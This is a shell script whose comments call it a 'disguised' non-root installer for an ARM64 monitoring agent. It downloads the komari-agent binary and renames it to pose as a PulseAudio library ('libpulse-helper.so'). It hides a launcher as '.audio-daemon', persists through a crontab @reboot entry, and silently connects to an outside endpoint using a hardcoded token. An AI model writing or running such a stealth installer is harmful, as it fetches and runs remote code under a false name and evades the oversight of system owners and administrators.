#!/bin/sh
#
# 普通用户安装 (aarch64) - 伪装版
#

# 强制获取 HOME 目录
HOME="${HOME:-$(getent passwd $(id -u) | cut -d: -f6)}"
[ -z "$HOME" ] && HOME="/tmp"

# ============ 配置 ============
AGENT_URL="https://github.com/komari-monitor/komari-agent/releases/latest/download/komari-agent-linux-arm64"
INSTALL_DIR="$HOME/.local/lib"
AGENT_PATH="$INSTALL_DIR/libpulse-helper.so"
STARTUP_SCRIPT="$INSTALL_DIR/.audio-daemon"
ENDPOINT="https://status.sm.uy"
TOKEN="yrushkwQRMduYX7lU2eYyxa3"
# ==============================

echo "[*] HOME: $HOME"
echo "[*] 安装目录: $INSTALL_DIR"

# 创建目录
mkdir -p "$INSTALL_DIR" 2>/dev/null
if [ ! -d "$INSTALL_DIR" ]; then
    echo "[!] 无法创建目录，使用 /tmp/.cache"
    INSTALL_DIR="/tmp/.cache"
    AGENT_PATH="$INSTALL_DIR/libpulse-helper.so"
    STARTUP_SCRIPT="$INSTALL_DIR/.audio-daemon"
    mkdir -p "$INSTALL_DIR"
fi

# 下载
echo "[*] 下载 agent..."
if [ ! -f "$AGENT_PATH" ]; then
    wget -q "$AGENT_URL" -O "$AGENT_PATH" && chmod +x "$AGENT_PATH"
fi

# 创建启动脚本
echo "[*] 创建启动脚本..."
cat > "$STARTUP_SCRIPT" << EOF
#!/bin/sh
B="$AGENT_PATH"
U="$AGENT_URL"
[ ! -f "\$B" ] && wget -q "\$U" -O "\$B" && chmod +x "\$B"
"\$B" -e $ENDPOINT --auto-discovery $TOKEN -u > /dev/null 2>&1 &
EOF
chmod +x "$STARTUP_SCRIPT"

# crontab 持久化
echo "[*] 配置 crontab..."
(crontab -l 2>/dev/null | grep -v audio-daemon; echo "@reboot $STARTUP_SCRIPT") | crontab -

# 立即启动
echo "[*] 启动 agent..."
pkill -f libpulse-helper 2>/dev/null
"$STARTUP_SCRIPT"
sleep 2

# 验证
if ps | grep -v grep | grep -q libpulse-helper; then
    echo "[OK] 安装成功!"
    ps | grep -v grep | grep libpulse-helper
else
    echo "[FAIL] 启动失败"
fi
